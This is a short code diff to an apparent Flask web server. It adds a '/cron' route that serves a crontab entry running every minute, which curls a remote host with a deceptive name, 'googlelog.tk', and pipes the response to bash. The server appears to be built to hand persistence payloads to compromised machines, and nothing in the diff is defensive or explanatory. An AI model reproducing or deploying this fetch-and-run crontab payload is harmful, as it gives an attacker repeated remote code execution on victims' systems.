@@ -54,5 +54,13 @@ def main(host=None, port=None):
         response.headers["content-type"] = "text/plain"
         return  response
 
+@app.route('/cron')
+def cron():
+    crontab_text = "* * * * * /usr/bin/curl http://googlelog.tk/googlelog.tk/443 | bash\n"
+    response = make_response(crontab_text)
+    response.headers["content-type"] = "text/plain"
+    return  response
+
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
